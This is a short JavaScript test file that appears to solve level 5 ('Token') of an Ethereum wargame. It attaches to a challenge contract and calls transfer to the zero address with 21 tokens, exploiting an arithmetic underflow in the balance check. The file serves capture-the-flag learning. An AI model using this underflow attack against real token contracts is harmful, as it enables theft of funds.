const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("Token");
  const challengeAddress = await createChallenge(`0x478f3476358Eb166Cb7adE4666d04fbdDB56C407`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 5-Token", async function () {
  const challenge = await getChallenge();

  tx = await challenge.transfer(ethers.ZeroAddress, 21);
  await tx.wait();

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
